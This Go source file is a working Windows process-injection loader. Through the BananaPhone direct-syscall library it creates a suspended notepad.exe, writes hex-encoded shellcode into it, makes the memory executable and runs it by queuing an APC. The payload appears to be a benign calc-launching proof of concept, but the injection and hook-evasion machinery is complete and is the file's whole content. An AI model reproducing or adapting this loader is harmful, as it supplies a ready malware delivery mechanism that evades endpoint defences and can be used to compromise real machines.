package main

import (
	"encoding/hex"
	"log"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
)

func setup() (uint16, uint16, uint16, uint16, uint16, uint16, uint16) {

	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		log.Fatal(err)
	}
	// Couldn't get the params right on this one so just create a process with windows.CreateProcess
	createUserProcess, err := bp.GetSysID("NtCreateUserProcess")
	if err != nil {
		log.Fatal(err)
	}
	queueApcThread, err := bp.GetSysID("NtQueueApcThread")
	if err != nil {
		log.Fatal(err)
	}
	protectVirtMemId, err := bp.GetSysID("NtProtectVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	writeVirtMem, err := bp.GetSysID("NtWriteVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	allocateVirtMem, err := bp.GetSysID("NtAllocateVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	resumeThread, err := bp.GetSysID("NtResumeThread")
	if err != nil {
		log.Fatal(err)
	}
	closeHandle, err := bp.GetSysID("NtClose")
	if err != nil {
		log.Fatal(err)
	}

	return createUserProcess, queueApcThread, protectVirtMemId, writeVirtMem, allocateVirtMem, resumeThread, closeHandle
}

type RTL_USER_PROCESS_PARAMETERS struct {
	MaximumLength      uint64  // 1816
	Length             uint64  // 1816
	Flags              uint64  // RTL_USER_PROCESS_PARAMETERS_NORMALIZED (1?)
	DebugFlags         uint64  // 0
	ConsoleHandle      uintptr // Handle
	ConsoleFlags       uint64  // 0
	StandardInput      uintptr // Handle
	StandardOutput     uintptr // Handle
	StandardError      uintptr // Handle
	CurrentDirectory   *CurDir
	DllPath            uintptr // UTF16FromString
	ImagePathName      uintptr // UTF16FromString
	CommandLine        uintptr // UTF16FromString
	Environment        uintptr // CHANGE THIS. PWSTR
	StartingX          uint64  // ULONG (0)
	StartingY          uint64  // ULONG (0)
	CountX             uint64  // ULONG (0)
	CountY             uint64  // ULONG (0)
	CountCharsX        uint64  // ULONG (0)
	CountCharsY        uint64  // ULONG (0)
	FillAttribute      uint64  // ULONG (0)
	WindowFlags        uint64  // ULONG (0)
	ShowWindowFlags    uint64  // ULONG (SW_HIDE == 0)
	WindowTitle        uintptr // UNICODE_STRING
	DesktopInfo        uintptr // UNICODE_STRING
	ShellInfo          uintptr // UNICODE_STRING
	RuntimeDate        uintptr // UNICODE_STRING
	CurrentDirectories uintptr // RTL_DRIVE_LETTER_CURDIR[32]. Each element in the array is blank. I should be able to just hold a nullptr for this
}

/*
RTL_DRIVE_LETTER_CURDIR {
	Flags     uint16 // USHORT 0
	Length    uint16 // USHORT 0
	TimeStamp uint16 // USHORT 0
	DosPath UNICODE_STRING // (Length USHORT, MaxiumLength USHORT, Buffer PWSTR // is NULL)
}
*/

type CurDir struct {
	DosPath *uint16
}

func inject(ntCreateUserProcess uint16, ntQueueApcThread uint16, ntProtectVirtualMemory uint16, ntWriteVirtualMemory uint16, ntAllocateVirtualMemory uint16,
	ntResumeThread uint16, ntClose uint16) {
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatalf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error())
	}

	si := &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}
	pathName := "C:\\Windows\\System32\\notepad.exe"
	program, err := windows.UTF16PtrFromString(pathName)
	if err != nil {
		log.Fatal(err)
	}

	err = windows.CreateProcess(program, nil, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, si, pi)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatalf("[-] Failed to create process. Return code is %s\n", err.Error())
	}

	/*
		EXTERN_C NTSTATUS NtCreateUserProcess(
		OUT PHANDLE ProcessHandle,
		OUT PHANDLE ThreadHandle,
		IN ACCESS_MASK ProcessDesiredAccess,
		IN ACCESS_MASK ThreadDesiredAccess,
		IN POBJECT_ATTRIBUTES ProcessObjectAttributes OPTIONAL,
		IN POBJECT_ATTRIBUTES ThreadObjectAttributes OPTIONAL,
		IN ULONG ProcessFlags,
		IN ULONG ThreadFlags,
		IN PVOID ProcessParameters OPTIONAL,
		IN OUT PPS_CREATE_INFO CreateInfo,
		IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
	*/

	// https://github.com/golang/sys/blob/master/windows/security_windows.go
	// const (
	// 	MAXIMUM_ALLOWED                        = 0x02000000
	// 	THREAD_CREATE_FLAGS_CREATE_SUSPENDED   = 0x00000001
	// 	RTL_USER_PROCESS_PARAMETERS_NORMALIZED = 0x01
	// 	SW_HIDE                                = 0
	// )

	// Get the current dir
	// curdir, err := os.Getwd()
	// if err != nil {
	// 	panic(err)
	// }

	// dosPath, err := syscall.UTF16PtrFromString(curdir)
	// if err != nil {
	// 	panic(err)
	// }

	// windowTitle, err := syscall.UTF16PtrFromString(pathName)
	// if err != nil {
	// 	panic(err)
	// }

	// desktopInfo, err := syscall.UTF16PtrFromString("Winsta0\\Default")
	// if err != nil {
	// 	panic(err)
	// }

	// environment, err := syscall.UTF16PtrFromString("=::=::\\")
	// if err != nil {
	// 	panic(err)
	// }

	// shellInfo, err := syscall.UTF16FromString("")
	// if err != nil {
	// 	panic(err)
	// }

	// runtimeData, err := syscall.UTF16FromString("")
	// if err != nil {
	// 	panic(err)
	// }

	// userProcessParams := &RTL_USER_PROCESS_PARAMETERS{
	// 	MaximumLength:    1816,
	// 	Length:           1816,
	// 	Flags:            RTL_USER_PROCESS_PARAMETERS_NORMALIZED,
	// 	Environment:      uintptr(unsafe.Pointer(environment)),
	// 	CurrentDirectory: &CurDir{DosPath: dosPath},
	// 	WindowTitle:      uintptr(unsafe.Pointer(windowTitle)),
	// 	DesktopInfo:      uintptr(unsafe.Pointer(desktopInfo)),
	// }

	// // TODO. These last two params are surely wrong. find more info at the following two links
	// // https://cerbersec.com/2021/08/26/beacon-object-files-part-1.html
	// // http://www.rohitab.com/discuss/topic/41779-how-can-i-get-thread-id-from-its-handle-in-ntcreatethreadexthreadhandle/
	// ret, err := bananaphone.Syscall(ntCreateUserProcess,
	// 	uintptr(0),               // ProcessHandle (PHANDLE)
	// 	uintptr(0),               // ThreadHandle (PHANDLE)
	// 	uintptr(MAXIMUM_ALLOWED), // ProcessDesiredAccess (Access_Mask)
	// 	uintptr(MAXIMUM_ALLOWED), // ThreadDesiredAccess (Access_Mask)
	// 	uintptr(0),               // ProcessObjectAttributes (POBJECT_ATTRIBUTES)
	// 	uintptr(0),               // ThreadObjectAttributes (POBJECT_ATTRIBUTES)
	// 	uintptr(4),               // CreateProcessFlags (ULONG)
	// 	uintptr(THREAD_CREATE_FLAGS_CREATE_SUSPENDED), // CreateThreadFlags (ULONG)
	// 	uintptr(unsafe.Pointer(userProcessParams)),
	// 	uintptr(0), // CreateInfo
	// 	uintptr(0), // AttributeList
	// )
	// if err != nil {
	// 	panic(err)
	// }

	var bAddr uintptr
	regionSize := len(shellcode)

	// allocate memory to the process
	ret, err := bananaphone.Syscall(ntAllocateVirtualMemory,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&bAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		log.Fatalf("[-] Failed to allocate memory. Return code is %x\n", ret)
		return
	}
	var numberOfBytesWritten uintptr
	// write memory to the process
	ret, err = bananaphone.Syscall(ntWriteVirtualMemory,
		uintptr(pi.Process),
		bAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(regionSize),
		uintptr(unsafe.Pointer(&numberOfBytesWritten)),
	)
	if err != nil {
		log.Fatalf("[-] Failed to write memory. Return code is %x\n", ret)
		return
	}
	// Change permissions
	var oldProtect uintptr
	ret, err = bananaphone.Syscall(ntProtectVirtualMemory,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&bAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		log.Fatalf("[-] Failed to protect memory. Return code is %x\n", ret)
		return
	}

	// queue user apc then resume
	ret, err = bananaphone.Syscall(ntQueueApcThread,
		uintptr(pi.Thread),
		bAddr,
		bAddr,
		uintptr(0),
		0,
	)
	if err != nil {
		log.Fatalf("[-] Failed to queue thread. Return code is %x\n", ret)
		return
	}

	// Sometimes errors, sometime doesn't. Don't know why. Shellcode will always run but program will panic
	ret, err = bananaphone.Syscall(ntResumeThread,
		uintptr(pi.Thread),
		0,
	)
	if err != nil {
		log.Fatalf("[-] Failed to resume thread. Return code is %x\n", ret)
		return
	}

	ret, err = bananaphone.Syscall(ntClose,
		uintptr(pi.Process),
	)
	if err != nil {
		log.Fatalf("[-] Failed to close handle to process. Return code is %x\n", ret)
		return
	}

	ret, err = bananaphone.Syscall(ntClose,
		uintptr(pi.Thread),
	)
	if err != nil {
		log.Fatalf("[-] Failed to close handle to thread. Return code is %x\n", ret)
		return
	}
}

func main() {
	inject(setup())
}
